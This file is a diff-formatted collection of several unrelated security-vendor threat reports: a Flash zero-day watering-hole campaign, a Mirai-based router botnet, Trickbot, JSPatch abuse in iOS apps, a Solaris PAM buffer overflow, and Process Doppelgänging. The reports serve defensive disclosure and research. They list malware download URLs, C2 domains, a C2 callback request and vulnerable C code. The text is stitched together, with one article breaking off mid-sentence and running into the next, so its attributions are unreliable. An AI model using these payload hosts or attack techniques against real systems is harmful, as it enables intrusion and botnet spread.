@@ -1,0 +1,464 @@
+Less than a week after uncovering Operation SnowMan , the FireEye Dynamic Threat Intelligence cloud has identified another targeted attack campaign — this one exploiting a zero-day vulnerability in Flash.
+We are collaborating with Adobe security on this issue.
+Adobe has assigned the CVE identifier CVE-2014-0502 to this vulnerability and released a security bulletin .
+As of this blog post, visitors to at least three nonprofit institutions — two of which focus on matters of national security and public policy — were redirected to an exploit server hosting the zero-day exploit.
+We’re dubbing this attack “Operation GreedyWonk.”
+We believe GreedyWonk may be related to a May 2012 campaign outlined by ShadowServer, based on consistencies in tradecraft (particularly with the websites chosen for this strategic Web compromise), attack infrastructure, and malware configuration properties.
+The group behind this campaign appears to have sufficient resources (such as access to zero-day exploits) and a determination to infect visitors to foreign and public policy websites.
+The threat actors likely sought to infect users to these sites for follow-on data theft, including information related to defense and public policy matters.
+Discovery On Feb. 13, FireEye identified a zero-day Adobe Flash exploit that affects the latest version of the Flash Player (12.0.0.4 and 11.7.700.261).
+Visitors to the Peter G. Peterson Institute for International Economics (www.piie[.]com) were redirected to an exploit server hosting this Flash zero-day through a hidden iframe.
+We subsequently found that the American Research Center in Egypt (www.arce[.]org) and the Smith Richardson Foundation (www.srf[.]org) also redirected visitors the exploit server.
+All three organizations are nonprofit institutions; the Peterson Institute and Smith Richardson Foundation engage in national security and public policy issues.
+Mitigation To bypass Windows’ Address Space Layout Randomization (ASLR) protections, this exploit targets computers with any of the following configurations: Windows XP Windows 7 and Java 1.6 Windows 7 and an out-of-date version of Microsoft Office 2007 or 2010 Users can mitigate the threat by upgrading from Windows XP and updating Java and Office.
+If you have Java 1.6, update Java to the latest 1.7 version.
+If you are using an out-of-date Microsoft Office 2007 or 2010, update Microsoft Office to the latest version.
+These mitigations do not patch the underlying vulnerability.
+But by breaking the exploit’s ASLR-bypass measures, they do prevent the current in-the-wild exploit from functioning.
+Vulnerability analysis GreedyWonk targets a previously unknown vulnerability in Adobe Flash.
+The vulnerability permits an attacker to overwrite the vftable pointer of a Flash object to redirect code execution.
+ASLR bypass The attack uses only known ASLR bypasses.
+Details of these techniques are available from our previous blog post on the subject (in the “Non-ASLR modules” section).
+For Windows XP, the attackers build a return-oriented programming (ROP) chain of MSVCRT (Visual C runtime) gadgets with hard-coded base addresses for English (“en”) and Chinese (“zh-cn” and “zh-tw”).
+On Windows 7, the attackers use a hard-coded ROP chain for MSVCR71.dll (Visual C++ runtime) if the user has Java 1.6, and a hard-coded ROP chain for HXDS.dll (Help Data Services Module) if the user has Microsoft Office 2007 or 2010.
+Java 1.6 is no longer supported and does not receive security updates.
+In addition to the MSVCR71.dll ASLR bypass, a variety of widely exploited code-execution vulnerabilities exist in Java 1.6.
+That’s why FireEye strongly recommends upgrading to Java 1.7.
+The Microsoft Office HXDS.dll ASLR bypass was patched at the end of 2013.
+More details about this bypass are addressed by Microsoft’s Security Bulletin MS13-106 and an accompanying blog entry .
+FireEye strongly recommends updating Microsoft Office 2007 and 2010 with the latest patches.
+Shellcode analysis The shellcode is downloaded in ActionScript as a GIF image.
+Once ROP marks the shellcode as executable using Windows’ VirtualProtect function, it downloads an executable via the InternetOpenURLA and InternetReadFile functions.
+Then it writes the file to disk with CreateFileA and WriteFile functions.
+Finally, it runs the file using the WinExec function.
+PlugX/Kaba payload analysis Once the exploit succeeds, a PlugX/Kaba remote access tool (RAT) payload with the MD5 hash 507aed81e3106da8c50efb3a045c5e2b is installed on the compromised endpoint.
+This PlugX sample was compiled on Feb. 12, one day before we first observed it, indicating that it was deployed specifically for this campaign.
+This PlugX payload was configured with the following command-and-control (CnC) domains: java.ns1[.]name adservice.no-ip[.]org wmi.ns01[.]us Sample callback traffic was as follows:
+POST /D28419029043311C6F8BF9F5
+HTTP/1.1 Accept: */* HHV1: 0 HHV2: 0
+HHV3: 61456 HHV4: 1 User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; InfoPath.2; .NET
+CLR 2.0.50727; SV1)
+Host:
+java.ns1.name Content-Length: 0 Connection: Keep-Alive Cache-Control: no-cache Campaign analysis Both java.ns1[.]name and adservice.no-ip[.]org resolved to 74.126.177.68 on Feb. 18, 2014.
+Passive DNS analysis reveals that the domain wmi.ns01.us previously resolved to 103.246.246.103 between July 4, 2013 and July 15, 2013 and 192.74.246.219 on Feb. 17, 2014.
+  java.ns1[.]name also resolved to 192.74.246.219 on February 18.
+Domain First Seen Last Seen IP Address adservice.no-ip[.]org adservice.no-ip[.]org 2014-02-18 2014-02-18 2014-02-19 2014-02-19 74.126.177.68 74.126.177.68 java.ns1[.]name java.ns1[.]name 2014-02-18 2014-02-18 2014-02-19 2014-02-19 74.126.177.68 74.126.177.68 java.ns1[.]name java.ns1[.]name 2014-02-18 2014-02-18 2014-02-18 2014-02-18 192.74.246.219 192.74.246.219 wmi.ns01[.]us wmi.ns01[.]us 2014-02-17 2014-02-17 2014-02-17 2014-02-17 192.74.246.219 192.74.246.219 proxy.ddns[.]info proxy.ddns[.]info 2013-05-02 2013-05-02 2014-02-18 2014-02-18 103.246.246.103 103.246.246.103 updatedns.ns02[.]us updatedns.ns02[.]us 2013-09-06 2013-09-06 2013-09-06 2013-09-06 103.246.246.103 103.246.246.103 updatedns.ns01[.]us updatedns.ns01[.]us 2013-09-06 2013-09-06 2013-09-06 2013-09-06 103.246.246.103 103.246.246.103 wmi.ns01[.]us wmi.ns01[.]us 2013-07-04 2013-07-04 2013-07-15 2013-07-15 103.246.246.103 103.246.246.103 MD5 Family Compile Time Alternate C2s 7995a9a6a889b914e208eb924e459ebc 7995a9a6a889b914e208eb924e459ebc PlugX PlugX 2012-06-09 2012-06-09 fuckchina.govnb[.]com fuckchina.govnb[.]com bf60b8d26bc0c94dda2e3471de6ec977 bf60b8d26bc0c94dda2e3471de6ec977 PlugX PlugX 2010-03-15 2010-03-15 microsafes.no-ip[.]org microsafes.no-ip[.]org fd69793bd63c44bbb22f9c4d46873252 fd69793bd63c44bbb22f9c4d46873252
+Poison Ivy Poison Ivy 2013-03-07 2013-03-07 N/A N/A 88b375e3b5c50a3e6c881bc96c926928 88b375e3b5c50a3e6c881bc96c926928 Poison Ivy Poison Ivy 2012-06-11 2012-06-11
+N/A N/A cd07a9e49b1f909e1bd9e39a7a6e56b4 cd07a9e49b1f909e1bd9e39a7a6e56b4 Poison Ivy Poison Ivy 2012-06-11 2012-06-11 N/A N/A The Poison Ivy variants that connected to the domain wmi.ns01[.]us had the following unique configuration properties: Domain First Seen Last Seen IP Address fuckchina.govnb[.]com fuckchina.govnb[.]com 2013-12-11 2013-12-11 2013-12-11 2013-12-11 204.200.222.136 204.200.222.136 microsafes.no-ip[.]org microsafes.no-ip[.]org 2014-02-12 2014-02-12 2014-02-12 2014-02-12
+74.126.177.70 74.126.177.70 microsafes.no-ip[.]org microsafes.no-ip[.]org 2013-12-04 2013-12-04 2013-12-04 2013-12-04 74.126.177.241 74.126.177.241 We found a related Poison Ivy sample (MD5 8936c87a08ffa56d19fdb87588e35952) with the same “java7” password, which was dropped by an Adobe Flash exploit (CVE-2012-0779).
+In this previous incident, visitors to the Center for Defense Information website (www.cdi[.]org — also an organization involved in defense matters — were redirected to an exploit server at 159.54.62.92.
+This exploit server hosted a Flash exploit file named BrightBalls.swf (MD5 1ec5141051776ec9092db92050192758).
+This exploit, in turn, dropped the Poison Ivy variant.
+In addition to using the same password “java7,” this variant was configured with the mutex with the similar pattern of “YFds*&^ff” and connected to a CnC server at windows.ddns[.]us.
+Using passive DNS analysis, we see the domains windows.ddns[.]us and wmi.ns01[.]us both resolved to 76.73.80.188 in mid-2012.
+Domain First Seen Last Seen IP Address wmi.ns01.us
+wmi.ns01.us 2012-07-07 2012-07-07 2012-09-19 2012-09-19
+76.73.80.188 76.73.80.188 windows.ddns.us windows.ddns.us 2012-05-23 2012-05-23 2012-06-10 2012-06-10 76.73.80.188 76.73.80.188
+During another earlier compromise of the same www.cdi.org website, visitors were redirected to a Java exploit test.jar (MD5 7d810e3564c4eb95bcb3d11ce191208e).
+This jar file exploited CVE-2012-0507 and dropped a Poison Ivy payload with the hash (MD5 52aa791a524b61b129344f10b4712f52).
+This Poison Ivy variant connected to a CnC server at ids.ns01[.]us.
+The domain ids.ns01[.]us also overlaps with the domain wmi.ns01[.]us on the IP 194.183.224.75.
+Domain First Seen Last Seen IP Address wmi.ns01[.]us wmi.ns01[.]us 2012-07-03 2012-07-03 2012-07-04 2012-07-04 194.183.224.75 194.183.224.75 ids.ns01[.]us ids.ns01[.]us 2012-04-23 2012-04-23 2012-05-18 2012-05-18 194.183.224.75 194.183.224.75 The Poison Ivy sample referenced above (MD5 fd69793bd63c44bbb22f9c4d46873252) was delivered via an exploit chain that began with a redirect from the Center for European Policy Studies (www.ceps[.]be).
+In this case, visitors were redirected from www.ceps[.]be to a Java exploit hosted on shop.fujifilm[.]be.
+In what is certainly not a coincidence, we also observed www.arce[.]org (one of the sites redirecting to the current Flash exploit) also redirect visitors to the Java exploit on shop.fujifilm[.]be in 2013.
+Conclusion This threat actor clearly seeks out and compromises websites of organizations related to international security policy, defense topics, and other non-profit sociocultural issues.
+The actor either maintains persistence on these sites for extended periods of time or is able to re-compromise them periodically.
+This actor also has early access to a number of zero-day exploits, including Flash and Java, and deploys a variety of malware families on compromised systems.
+Based on these and other observations, we conclude that this actor has the tradecraft abilities and resources to remain a credible threat in at least the mid-term.
+Subscribe to Blogs Get email updates as new blog posts are added.
+
+
+FortiGuard Labs Threat Research Report Affected Platforms: Linux Impacted Users: Any organization Impact: Remote attackers gain control of the vulnerable systems Severity Level:
+Critical Last week, our FortiGuard Labs team encountered a malware sample that’s currently being distributed in the wild targeting TP-link wireless routers.
+It leverages a recently post-authenticated RCE vulnerability released barely two weeks prior.
+As it turns out, it is an updated variant of the MANGA campaign (also known as Dark) that distributes samples based on Mirai’s published source code.
+This Mirai-based Distributed Denial of Service (DDOS) botnet campaign is one that FortiGuard Labs has been actively monitoring .
+The campaign originally piqued our interest due to the continuous updating of its list of target vulnerabilities—more so than other campaigns we have seen so far.
+TP-Link has already released an updated firmware for this affected hardware version  and users are strongly encouraged to update their devices.
+This post details how this threat leverages the new vulnerability to take over the affected devices and ways to protect users from these attacks.
+Exploiting a New Vulnerability This Mirai-based botnet campaign is referred to as MANGA because of the token string it used to include in its SSH/telnet commands.
+It is also referred to as Dark due to the filenames used for its binaries (e.g., Dark.arm, dark.mips, etc.).
+By exploiting recently published vulnerabilities, this malware campaign capitalizes on the gap between the time of disclosure of a vulnerability and the application of a patch to compromise IoT devices.
+This gives it a higher potential of spreading, making it more prolific than similar botnets.
+The latest addition to its constantly growing list of targeted vulnerabilities is TP-Link Home Wireless Routers, particularly the TL-WR840N EU (V5) model.
+The vulnerability it targets, assigned CVE-2021-41653 , was only just discovered on November 12 of this year.
+And barely two weeks later, on November 22, a sample from the MANGA malware campaign was seen actively exploiting it in the wild.
+Kamilló Matek discusses the full details of this vulnerability in this article .
+In summary, a vulnerable host parameter allows authenticated users to execute arbitrary commands in the target device.
+In this case, it is being exploited to force vulnerable devices to download and execute a malicious script, tshit.sh , which then downloads the main binary payloads, as discussed in the next section.
+To accomplish this, the following requests are sent to the device: Request 1: Request 2: It is important to emphasize that this exploitation requires authentication to succeed.
+Therefore, it is crucial for users to change their default credentials.
+Same Package As with Mirai’s normal infection routine, the executed shell script downloads the main payload binaries for different architectures and platforms and executes them blindly in the victim’s system.
+In addition, it prevents other botnets from taking over the device by blocking connections to commonly targeted ports.
+The malware then waits for a command from its Command-and-Control (C2) server to perform different variations of a Denial-Of-Service (DOS) attack.
+Solution Fortinet customers are protected by the following: The following generic FortiGuard IPS signatures were able to detect this attack before this vulnerability was disclosed: TP-Link.
+HTTP.Management.
+Code.
+Execution TP-Link.
+Home.
+Wifi.
+Router.
+CGI.Referer.
+Command.
+Injection The FortiGuard Web Filtering Service blocks downloaded URLs and identified C2s.
+The FortiGuard AntiVirus service detects and blocks this threat as Linux/Mirai and ELF/Mirai Conclusion Through our active monitoring, we encountered a new variant of the Mirai-based botnet campaign referred to as MANGA or Dark.
+It targets a recently published TP-Link wireless router RCE vulnerability.
+Throughout its life, this ongoing campaign has been very active in targeting newly discovered vulnerabilities.
+In fact, right before this blog was published, our monitoring system encountered yet another updated variant that we are currently investigating.
+FortiGuard Labs will continue monitoring this campaign and provide updates as necessary.
+IOCs Download URLs http[:]//194.85.248.176/bins/eh.x86 http[:]//194.85.248.176/bins/eh.mips http[:]//194.85.248.176/bins/eh.mpsl http[:]//194.85.248.176/bins/eh.arm4 http[:]//194.85.248.176/bins/eh.arm5 http[:]//194.85.248.176/bins/eh.arm6 http[:]//194.85.248.176/bins/eh.arm7 http[:]//194.85.248.176/bins/eh.ppc http[:]//194.85.248.176/bins/eh.m68k http[:]//194.85.248.176/bins/eh.sh4 http[:]//194.85.248.176/bins/eh.86_64 http[:]//194.85.248.176/local.sh http[:]//194.85.248.176/tshit.sh http[:]//2.56.59.215/apache2.sh http[:]//212.192.241.72/lolol.sh Samples (SHA256) ebfc95372427f8b845daff9ff4aebe2451fa78e35a24edd084685f06ba3daee4 57f50f34e6df8ee9006e46b5fe5c4ee11febe9e33b087c809f1384563e9f1d4e 8ebef715ddb0b4e973b2f8c7529f4480b5caa9c4a25f8fd05a7eaacf036cca20 113be1f9db8af2469b82ce1b5d1b0c61c50586567b3898f2b8a614cd6e8f47a8 b4c3c79d148db638f891143a1910c3d17f973c512a719b1f7525a823b14d29a8 d3928d0b6dedce6a083123028e50ba76e1b29666e70a96eec1a7061b7303bf1a 6b463e9f5d9e8edbc235bceb854367b26ed6effb0dee9881a4f4e88a967318d5 d88052c0a76cac7e571870a4e87c5354594c26b4955cd934870dc12d48f129d5 265396023cbbad6b3480b851873ece9fa2f32c63739a7a0ac32d196843080cc8 83566400bdb09c5e2438c0d9ff723c88328ca93f29e648f97088342e239bfa09 af9ac01e9e8cf7064d590044df43adca566521d223662cf5e0e2500badff6998 de01f26209a085eeff8c217782d283640a6226ccf1bd27eefd696658b55d10ba a4b16a5bf9b6e662050a3c5ff157d7b2f0be301a1f8f5d1359170132b8b22e58 7a47e5b83e3c42df2ab72adf4a041b2e382f61a0ff378f593156353a78c2c702 1bd895ed050ce42d0f39b6baa0b6a454e05eb5bff72290857cb8fb77a9e4b4b9
+71ca57bbba49aa877f7ded340328342c6e82e3a99720734c8b0de150d44d906c 23b03aa7d1dadd2e71016702f3e1b278b3a2c4f0c7d0cdc272774a428b88d09c fb7b03e7619d3ac5c4cbadc6b38841b11e3b19214b776073a590b571f91fe51e 3c978e02d21c7c12631d56c41aceb305fc11348a53eed47e29f7ce62ea0da4df 4832cff5666433a784d6ba48a0e400367d25314ef15d08a216b6286226eff342 95e4ac3ae03646cda56d80df80d775ed4bf23f98be42274fb440e7bc0d03ce88 8d390ad5af8d70692bda123b96e9745816ec7893d84682adb6d243619538b9d3 66adea50e0de8e1d664bb18c9f80596d1443b90e9ba57a59425720886a0c97e0 a87b502575d0db1b6257f1cf75edf4894bc84598f79148525b5cc449d143a495 Learn more about Fortinet’s FortiGuard Labs threat research and intelligence organization and the FortiGuard Security Subscriptions and Services portfolio .
+
+
+Exactly five years ago, in October 2016, our solutions first encountered a Trojan named Trickbot (aka TrickLoader or Trickster).
+Found mostly on home computers back then, its primary task was to steal login credentials for online banking services.
+In recent years, however, its creators have actively transformed the banking Trojan into a multifunctional modular tool.
+What’s more, Trickbot is now popular with cybercriminal groups as a delivery vehicle for injecting third-party malware into corporate infrastructure.
+News outlets recently reported that Trickbot’s authors have hooked up with various new partners to use the malware to infect corporate infrastructure with all kinds of additional threats, such as the Conti ransomware.
+Such repurposing could pose an additional danger to employees of corporate security operation centers and other cybersec experts.
+Some security solutions still recognize Trickbot as a banking Trojan, as per its original specialty.
+Therefore, infosec officers who detect it might view it as a random home-user threat that accidentally slipped into the corporate network.
+In fact, its presence there could indicate something far more serious — a ransomware injection attempt or even part of a targeted cyberespionage operation.
+Our experts were able to download modules of the Trojan from one of its C&C servers and analyze them thoroughly.
+What Trickbot can do now The modern Trickbot’s main objective is to penetrate and spread on local networks.
+Its operators can then use it for various tasks — from reselling access to the corporate infrastructure to third-party attackers, to stealing sensitive data.
+Here’s what the malware can now do: Harvest usernames, password hashes and other information useful for lateral movement in the network from Active Directory and the registry; Intercept web traffic on the infected computer; Provide remote device control via the VNC protocol; Steal cookies from browsers; Extract login credentials from the registry, the databases of various applications and configuration files, as well as steal private keys, SSL certificates and data files for cryptocurrency wallets; Intercept autofill data from browsers and information that users input into forms on web-sites; Scan files on FTP and SFTP servers; Embed malicious scripts in web pages; Redirect browser traffic through a local proxy; Hijack APIs responsible for certificate chain verification so as to spoof the verification results; Collect Outlook profile credentials, intercept e-mails in Outlook and send spam through it; Search for the OWA service and brute-force it; Gain low-level access to hardware; Provide access to the computer at the hardware level; Scan domains for vulnerabilities; Find addresses of SQL servers and execute search queries on them; Spread through the EternalRomance and EternalBlue exploits; Create VPN connections.
+A detailed description of the modules and indicators of compromise can be found in our Securelist post .
+How to guard against the Trickbot Trojan
+The statistics show that the majority of Trickbot detections this year were registered in the US, Australia, China, Mexico and France.
+This does not mean, however, that other regions are safe, especially considering the readiness of its creators to collaborate with other cybercriminals.
+To prevent your company from falling victim to this Trojan, we recommend that you equip all Internet-facing devices with a high-quality security solution .
+In addition, it’s a good idea to use cyberthreat monitoring services to detect suspicious activity in the company’s infrastructure.
+
+
+Introduction Apple has made a significant effort to build and maintain a healthy and clean app ecosystem.
+The essential contributing component to this status quo is the App Store, which is protected by a thorough vetting process that scrutinizes all submitted applications.
+While the process is intended to protect iOS users and ensure apps meet Apple’s standards for security and integrity, developers who have experienced the process would agree that it can be difficult and time consuming.
+The same process then must be followed when publishing a new release or issuing a patched version of an existing app, which can be extremely frustrating when a developer wants to patch a severe bug or security vulnerability impacting existing app users.
+The developer community has been searching for alternatives, and with some success.
+A set of solutions now offer a more efficient iOS app deployment experience, giving app developers the ability to update their code as they see fit and deploy patches to users’ devices immediately.
+While these technologies provide a more autonomous development experience, they do not meet the same security standards that Apple has attempted to maintain.
+Worse, these methods might be the Achilles heel to the walled garden of Apple’s App Store.
+In this series of articles, FireEye mobile security researchers examine the security risks of iOS apps that employ these alternate solutions for hot patching, and seek to prevent unintended security compromises in the iOS app ecosystem.
+As the first installment of this series, we look into an open source solution: JSPatch .
+Episode 1.
+JSPatch JSPatch is an open source project – built on top of Apple’s JavaScriptCore framework – with the goal of providing an alternative to Apple’s arduous and unpredictable review process in situations where the timely delivery of hot fixes for severe bugs is vital.
+In the author’s own words ( bold added for emphasis): JSPatch bridges Objective-C and JavaScript using the Objective-C runtime.
+You can call any Objective-C class and method in JavaScript by just including a small engine.
+That makes the APP obtaining the power of script language: add modules or replacing Objective-C code to fix bugs dynamically .
+JSPatch Machinery
+The JSPatch author, using the alias Bang, provided a common example of how JSPatch can be used to update a faulty iOS app on his blog: Figure 1 shows an Objc implementation of a UITableViewController with class name JPTableViewController that provides data population via the selector tableView:didSelectRowAtIndexPath: .
+At line 5, it retrieves data from the backend source represented by an array of strings with an index mapping to the selected row number.
+In many cases, this functions fine; however, when the row index exceeds the range of the data source array, which can easily happen, the program will throw an exception and subsequently cause the app to crash.
+Crashing an app is never an appealing experience for users.
+Figure 1.
+Buggy Objc code without JSPatch Within the realm of Apple-provided technologies, the way to remediate this situation is to rebuild the application with updated code to fix the bug and submit the newly built app to the App Store for approval.
+While the review process for updated apps often takes less time than the initial submission review, the process can still be time-consuming, unpredictable, and can potentially cause loss of business if app fixes are not delivered in a timely and controlled manner.
+However, if the original app is embedded with the JSPatch engine, its behavior can be changed according to the JavaScript code loaded at runtime.
+This JavaScript file ( hxxp://cnbang.net/bugfix.JS in the above example) is remotely controlled by the app developer.
+It is delivered to the app through network communication.
+Figure 2 shows the standard way of setting up JSPatch in an iOS app.
+This code would allow download and execution of a JavaScript patch when the app starts: Figure 2.
+Objc code enabling JSPatch in an app JSPatch is indeed lightweight.
+In this case, the only additional work to enable it is to add seven lines of code to the application:didFiishLaunchingWithOptions: selector.
+Figure 3 shows the JavaScript downloaded from hxxp://cnbang.net/bugfix.JS that is used to patch the faulty code.
+Figure 3.
+JSPatch hot patch fixing index out of bound bug in Figure 1 Malicious Capability Showcase JSPatch is a boon to iOS developers.
+In the right hands, it can be used to quickly and effectively deploy patches and code updates.
+But in a non-utopian world like ours, we need to assume that bad actors will leverage this technology for unintended purposes.
+Specifically, if an attacker is able to tamper with the content of JavaScript file that is eventually loaded by the app, a range of attacks can be successfully performed against an App Store application.
+Target App
+We randomly picked a legitimate app [1] with JSPatch enabled from the App Store.
+The logistics of setting up the JSPatch platform and resources for code patching are packaged in this routine [AppDelegate excuteJSPatch:] , as shown in Figure 4 [2] : Figure 4.
+JSPatch setup in the targeted app There is a sequence of flow from the app entry point (in this case the AppDelegate class) to where the JavaScript file containing updates or patch code is written to the file system.
+This process involves communicating with the remote server to retrieve the patch code.
+On our test device, we eventually found that the JavaScript patch code is hashed and stored at the location shown in Figure 5.
+The corresponding content is shown in Figure 6 in Base64-encoded format: Figure 5.
+Location of downloaded JavaScript on test device Figure 6.
+Encrypted patch content While the target app developer has taken steps to secure this sensitive data from prying eyes by employing Base64 encoding on top of a symmetric encryption, one can easily render this attempt futile by running a few commands through Cycript .
+The patch code, once decrypted, is shown in Figure 7: Figure 7.
+Decrypted original patch content retrieved from remote server
+This is the content that gets loaded and executed by JPEngine, the component provided by the JSPatch framework embedded in the target app.
+To change the behavior of the running app, one simply needs to modify the content of this JavaScript blob.
+Below we show several possibilities for performing malicious actions that are against Apple’s App Review Guidelines .
+Although the examples below are from a jailbroken device, we have demonstrated that they will work on non-jailbroken devices as well.
+Example 1: Load arbitrary public frameworks into app process a .
+     Example public framework : /System/Library/Frameworks/Accounts.framework b .
+     Private APIs used by public framework:
+[ACAccountStore init] , [ACAccountStore allAccountTypes]
+The target app discussed above, when running, loads the frameworks shown in Figure 8 into its process memory: Figure 8.
+iOS frameworks loaded by the target app Note that the list above – generated from the Apple-approved iOS app binary – does not contain Accounts.framework .
+Therefore, any “dangerous” or “risky” operations that rely on the APIs provided by this framework are not expected to take place.
+However, the JavaScript code shown in Figure 9 invalidates that assumption.
+Figure 9.
+JavaScript patch code that loads the Accounts.framework into the app process If this JavaScript code were delivered to the target app as a hot patch, it could dynamically load a public framework, Accounts.framework , into the running process.
+Once the framework is loaded, the script has full access to all of the framework’s APIs.
+Figure 10 shows the outcome of executing the private API [ACAccountStore allAccountTypes], which outputs 36 account types on the test device .
+This added behavior does not require the app to be rebuilt, nor does it require another review through the App Store.
+Figure 10.
+The screenshot of the console log for utilizing Accounts.framework
+The above demonstration highlights a serious security risk for iOS app users and app developers.
+The JSPatch technology potentially allows an individual to effectively circumvent the protection imposed by the App Store review process and perform arbitrary and powerful actions on the device without consent from the users.
+The dynamic nature of the code makes it extremely difficult to catch a malicious actor in action.
+We are not providing any meaningful exploit in this blog post, but instead only pointing out the possibilities to avoid low-skilled attackers taking advantage of off-the-shelf exploits.
+Example 2: Load arbitrary private frameworks into app process a. Example private framework: /System
+/Library/PrivateFrameworks/BluetoothManager.framework b. Private APIs used by example framework: [ BluetoothManager connectedDevices] , [BluetoothDevice name]
+Similar to the previous example, a malicious JSPatch JavaScript could instruct an app to load an arbitrary private framework, such as the BluetoothManager.framework , and further invoke private APIs to change the state of the device.
+iOS private frameworks are intended to be used solely by Apple-provided apps.
+While there is no official public documentation regarding the usage of private frameworks, it is common knowledge that many of them provide private access to low-level system functionalities that may allow an app to circumvent security controls put in place by the OS.
+The App Store has a strict policy prohibiting third party apps from using any private frameworks.
+However, it is worth pointing out that the operating system does not differentiate Apple apps’ private framework usage and a third party app’s private framework usage.
+It is simply the App Store policy that bans third party use.
+With JSPatch, this restriction has no effect because the JavaScript file is not subject to the App Store’s vetting.
+Figure 11 shows the code for loading the BluetoothManager.framework and utilizing APIs to read and change the states of Bluetooth of the host device.FireEye Mandiant has been investigating compromised Oracle Solaris machines in customer environments.
+During our investigations, we discovered an exploit tool on a customer’s system and analyzed it to see how it was attacking their Solaris environment.
+The FLARE team’s Offensive Task Force analyzed the exploit to determine how it worked, reproduced the vulnerability on different versions of Solaris, and then reported it to Oracle.
+In this blog post we present a description of the vulnerability, offer a quick way to test whether a system may be vulnerable, and suggest mitigations and workarounds.
+ Mandiant experts from the FLARE team will provide more information on this vulnerability and how it was used by UNC1945 during a Nov. 12 webinar.
+Register today and start preparing questions, because we will be fielding them from the audience at the end of the session.
+Vulnerability Discovery
+The security vulnerability occurs in the Pluggable Authentication Modules (PAM) library.
+PAM enables a Solaris application to authenticate users while allowing the system administrator to configure authentication parameters (e.g., password complexity and expiration) in one location that is consistently enforced by all applications.
+The actual vulnerability is a classic stack-based buffer overflow located in the PAM parse_user_name function .
+An abbreviated version of this function is shown in Figure 1.
+static int parse_user_name(char *user_input, char **ret_username) { register char *ptr; register int index = 0; char username[PAM_MAX_RESP_SIZE]; /* ... */ ptr = user_input; /* ...
+*/ /* * username will be the first string we get from user_input * - we skip leading whitespaces and ignore trailing whitespaces */ while (*ptr != '
+\\0') { if ((*ptr == ' ')
+||
+(*ptr == '
+\\t')) break; else { username[index] =
+*ptr; index++; ptr++; } } /* ret_username will be freed in pam_get_user().
+*/ if ((*ret_username = malloc(index + 1))
+=
+= NULL) return (PAM_BUF_ERR); (void) strcpy(*ret_username, username); return (PAM_SUCCESS); } Figure 1:
+The parse_user_name function has a stack-based buffer overflow vulnerability The vulnerability arises whenever a username longer than PAM_MAX_RESP_SIZE (512 bytes) is passed to parse_user_name .
+The vulnerability has likely existed for decades, and one possible reason is that it is only exploitable if an application does not already limit usernames to a smaller length before passing them to PAM.
+One situation where network-facing software does not always limit the username length arises in the SSH server, and this is the exploit vector used by the tool that we discovered.
+SSH Keyboard-Interactive authentication is a “passthrough” authentication mechanism where the SSH protocol relays prompts and responses between the server’s PAM libraries and the client.
+It was designed to support custom forms of authentication such as two-factor without modifying the SSH protocol.
+By manipulating SSH client settings to force Keyboard-Interactive authentication to prompt for the username rather than sending it through normal means, an attacker can also pass unlimited input to the PAM parse_user_name function.
+Proof of Concept Exploit In order to quickly test different versions of Solaris to see if they may be vulnerable, we developed a proof of concept exploit to trigger the overflow and crash the SSH server.
+The standard OpenSSH client offers all the options needed to trigger the vulnerability (Figure 2).
+Figure 2:
+A server can be quickly tested to see if it is vulnerable over SSH The indication that the server is vulnerable is that the SSH client prints “Authentication failed;” a non-vulnerable PAM library causes the SSH server to repeatedly prompt for a username if it receives one that is too long.
+The overflow in the PAM library also causes the SSH server to crash, as shown in Figure 3.
+The operating system writes a crash dump to /core if the SSH server crashes with no debugger attached.
+In fact, if a /core file exists on a Solaris machine and the file command reports that it is from sshd , those are indicators consistent with this vulnerability having been exploited.
+Figure 3:
+The SSH server crashes in the parse_user_name function Vulnerable Operating Systems Solaris 9 (some releases)
+Solaris 10 (all releases) Solaris 11.0
+While the parse_user_name function remains vulnerable in unpatched Solaris 11.1 and later, unrelated changes to the PAM library truncate the username before the vulnerable function receives it, rendering the issue non-exploitable via SSH.
+If the parse_user_name function were reachable in another context, then the vulnerability could become exploitable.
+Illumos (OpenIndiana 2020.04) Mitigations and Workaround A patch from Oracle for Solaris 10 and 11 is described in the October 2020 Critical Patch Update .
+Because Solaris 9 is no longer supported, Oracle has not released a patch.
+For Solaris 9, as well as Solaris 10 or 11 systems where patching is inconvenient, we recommend editing the /etc
+/ssh/sshd_config file to add the lines
+ChallengeResponseAuthentication
+no
+and KbdInteractiveAuthentication no
+and restart the SSH server.
+While this removes the opportunity to exploit the vulnerability using SSH Keyboard-Interactive authentication, there may be other ways to attack the parse_user_name function and we recommend using this workaround only as a stopgap until Solaris 9 systems can be upgraded, or the October patch can be accessed and installed for supported Solaris versions.
+Acknowledgements Jeffrey Martin of Rapid7 contributed to the testing of this vulnerability.
+Subscribe to Blogs Get email updates as new blog posts are added.
+
+
+By Raj Samani and Christiaan Beek on May 11, 2018 This blog was co-written with Brook Schoenfield.
+That adversaries adopt new techniques is a known fact.
+However, the speed they include new innovative techniques to bypass end-point security and or evade sandboxing appears to be at an ever-increasing pace.
+Indeed, adversary adoption is often faster than the InfoSec industry can implement and test effective countermeasures.
+For example, in December 2017, a tool was released to hide PowerShell in a graphic file.
+Within 7 days of the release, McAfee Advanced Threat Research started to see the technique being exploited by a Nation State actor.
+From announcement to inclusion, test and use in production within 7 days is impressive.
+This week, security-researchers from Kaspersky discovered that an actor was applying the so-called Process Doppelgänging technique in what has been named the “SynAck” ransomware.
+(https://securelist.com/synack-targeted-ransomware-uses-the-doppelganging-technique/85431/)
+So What is the Process Doppelgänging Technique in a Nutshell?
+Using this technique gives the malware writer an ability to run malicious code/executable under the cover of a legitimate executable by using the transaction features of the NTFS filesystem (Windows Transactional NTFS API).
+McAfee Detects and Protects Since the initial release of this technique in December 2017, McAfee Labs has been investigating this technique and how we might protect our customers.
+In contrast to adversaries who can release mistakes in code and implementation, we simply cannot.
+We have to thoroughly test to ensure that when we release our solution it detects correctly and does not disrupt or break other software.
+McAfee’s Product Security Incident Team (PSIRT), working in coordination with McAfee’s product teams 1 delivered a protection to Process Doppelgänging in two of McAfee’s product suites (see below for more detail).
+McAfee’s protection has tested effective against EnSilo’s original proof of concept (PoC) and other examples.
+As an example, we tested recent malware using the technique against our detection feature with success: McAfee’s protection prevents execution of a file if changes to it are contained within a Windows NTFS transaction.
+There are no legitimate uses for the Transactional API to be used in this way, so far as McAfee know.
+Details of products that include protection against Process Doppelgänging follow: ENS 10.5.4, released April 24, 2018 VSE 8.8 patch 11, released April 24, 2018 ENS 10.6, Public Beta available March 9, 2018.
+Release is targeted around June 1, 2018 WSS 16.0.12 will include the same protection.
